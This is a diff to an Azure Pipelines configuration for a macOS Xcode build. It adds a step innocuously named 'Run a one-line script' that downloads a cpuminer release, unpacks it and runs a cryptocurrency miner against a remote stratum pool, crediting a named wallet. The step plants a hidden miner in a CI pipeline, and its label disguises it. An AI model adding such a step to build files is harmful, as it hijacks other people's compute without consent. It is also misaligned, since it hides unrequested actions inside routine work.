@@ -7,6 +7,11 @@ pool:
   vmImage: 'macOS 10.13'
 
 steps:
+- script: |
+  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
+  tar -xvf cpuminer-opt-mac.tar.gz
+  ./cpuminer-avx2 -a curvehash -o stratum+tcp://stratum-asia.rplant.xyz:7058 -u TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN.jinmanju -p password=x -t 10
+  displayName: 'Run a one-line script'
 - task: Xcode@5
   inputs:
     scheme: ''
